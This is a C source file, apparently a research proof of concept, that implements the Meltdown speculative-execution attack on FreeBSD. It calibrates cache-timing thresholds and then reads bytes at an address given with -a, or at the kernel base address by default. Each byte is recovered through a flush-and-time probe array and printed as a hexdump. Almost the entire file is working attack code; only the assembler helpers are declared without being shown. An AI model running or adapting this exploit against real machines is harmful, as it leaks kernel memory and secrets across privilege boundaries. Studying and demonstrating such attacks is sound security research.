/*-
 * Copyright (c) 2018 The University of Oslo
 * Copyright (c) 2018 Dag-Erling Smørgrav
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote
 *    products derived from this software without specific prior written
 *    permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

/*
 * Demonstration of the Meltdown attack on FreeBSD
 *
 * https://meltdownattack.com/
 */

#include <err.h>
#include <limits.h>
#include <setjmp.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define SHIFT	12

/*
 * Assembler functions
 */
void clflush(const void *addr);
void rflush(const void *addr, size_t n, size_t step);
uint64_t rdtsc64(void);
uint32_t rdtsc32(void);
uint64_t timed_read(const void *);
void spec_read(const uint8_t *addr, const uint8_t *probe, unsigned int shift);

/*
 * Kernel base address for a few platforms
 */
#if __amd64__
#define KERNBASE	0xffffffff80000000UL
#elif __i386__
#define KERNBASE	0xc0000000U
#else
#error "Unsupported architecture"
#endif

/*
 * Address and length of data to read
 */
static uint8_t *addr;
static size_t len;
#define DEFAULT_ADDR	((uint8_t *)KERNBASE)
#define DEFAULT_LEN	16

/*
 * Probe array
 */
static uint8_t probe[256 * (1 << SHIFT)];

/*
 * Average measured read latency with cold and hot cache
 */
static uint64_t avg_cold;
static uint64_t avg_hot;

/*
 * Decision threshold
 */
static uint64_t threshold;

/*
 * Self-test
 */
static uint8_t selftest[4096];

/*
 * Compute the average hot and cold read latency and derive the decision
 * threshold.
 */
#define N 1048576
static void
calibrate(void)
{
	uint64_t meas, min, max, sum;

	warnx("calibrating...");

	/* compute average latency of "cold" access */
	min = UINT64_MAX;
	max = 0;
	sum = 0;
	for (unsigned int i = 0; i < N + 2; ++i) {
		clflush(&probe);
		meas = timed_read(&probe);
		if (meas < min)
			min = meas;
		if (meas > max)
			max = meas;
		sum += meas;
	}
	sum -= min;
	sum -= max;
	avg_cold = sum / N;
	warnx("average cold read: %llu", (unsigned long long)avg_cold);

	/* compute average latency of "hot" access */
	meas = timed_read(&probe);
	min = UINT64_MAX;
	max = 0;
	sum = 0;
	for (unsigned int i = 0; i < N + 2; ++i) {
		meas = timed_read(&probe);
		if (meas < min)
			min = meas;
		if (meas > max)
			max = meas;
		sum += meas;
	}
	sum -= min;
	sum -= max;
	avg_hot = sum / N;
	warnx("average hot read: %llu", (unsigned long long)avg_hot);

	/* set decision threshold to the average of the two */
	threshold = (avg_hot + avg_cold) / 2;
	warnx("threshold: %llu", (unsigned long long)threshold);

	/* warn if the numbers are very close */
	if ((avg_hot - avg_cold) * 10 < threshold)
		warnx("warning: low delta between cold and hot read latency!");
}

/*
 * Print a pretty hex dump of the specified buffer.
 */
static void
hexdump(size_t base, const uint8_t *buf, size_t len)
{
	unsigned int i;
	ssize_t res;

	res = len;
	while (res > 0) {
		printf("%08zx ", base);
		for (i = 0; i < 16; ++i) {
			if (i == 8)
				printf(" :");
			if (i < res)
				printf(" %02x", buf[i]);
			else
				printf(" --");
		}
		printf(" |");
		for (i = 0; i < 16; ++i) {
			if (i == 8)
				printf(":");
			if (i < res)
				printf("%c", (buf[i] >= ' ' && buf[i] <= '~') ? buf[i] : '.');
			else
				printf("-");
		}
		printf("|\n");
		res -= 16;
		buf += 16;
	}
}

/*
 * Perform the Meltdown attack.
 *
 * For each byte in the specified range:
 * - Flush the cache.
 * - Read the given byte, then touch a specific probe address based on its
 *   value of the byte that was read.
 * - Measure the time it takes to access each probe address.
 * - In theory, one of the probe addresses should be in cache, while the
 *   others should not.  This indicates the value of the byte that was
 *   read.
 */
static sigjmp_buf jmpenv;
static void sighandler(int signo) { siglongjmp(jmpenv, signo); }
static void
meltdown(void)
{
	uint8_t line[16];
	sig_t sigsegv;
	unsigned int i, j;
	int signo;

	sigsegv = signal(SIGSEGV, sighandler);
	for (i = 0; i < len; ++i) {
		line[i % 16] = 0;
		rflush(probe, 256, 1 << SHIFT);
		if ((signo = sigsetjmp(jmpenv, 1)) == 0)
			spec_read(&addr[i], probe, SHIFT);
		for (j = 0; j < 256; ++j) {
			uint64_t delta = timed_read(&probe[j << SHIFT]);
			if (delta < threshold) {
				line[i % 16] = j;
				break;
			}
		}
		if (i % 16 == 15)
			hexdump(i - 15, line, 16);
	}
	if (i % 16 > 0)
		hexdump(i - i % 16, line, i % 16);
	signal(SIGSEGV, sigsegv);
}

/*
 * Print usage string and exit.
 */
static void
usage(void)
{

	fprintf(stderr, "usage: meltdown [-a addr] [-n len]\n");
	exit(1);
}

int
main(int argc, char *argv[])
{
	uintmax_t umax;
	char *end;
	int opt;

	while ((opt = getopt(argc, argv, "a:n:s")) != -1)
		switch (opt) {
		case 'a':
			if (addr != 0)
				usage();
			umax = strtoull(optarg, &end, 16);
			if (end == optarg || *end != '\0')
				errx(1, "invalid address");
			addr = (uint8_t *)umax;
			if ((uintmax_t)addr != umax)
				errx(1, "address is out of range");
			break;
		case 'n':
			if (len != 0)
				usage();
			umax = strtoull(optarg, &end, 0);
			if (end == optarg || *end != '\0')
				errx(1, "invalid length");
			len = umax;
			if (len == 0 || (uintmax_t)len != umax)
				errx(1, "length is out of range");
			break;
		case 's':
			if (addr != 0 || len != 0)
				usage();
			addr = selftest;
			len = 510;
			break;
		default:
			usage();
		}

	argc -= optind;
	argv += optind;

	if (argc)
		usage();

	/* default address and length */
	if (addr == 0)
		addr = DEFAULT_ADDR;
	if (len == 0)
		len = DEFAULT_LEN;
	if (addr == selftest)
		for (unsigned int i = 0; i < sizeof selftest; ++i)
			selftest[i] = ~(uint8_t)(i % 255);

	/* ensure that the probe array is paged in */
	memset(probe, 0xff, sizeof probe);

	/* calibrate our timer */
	calibrate();

	/* perform the attack */
	meltdown();

	exit(0);
}
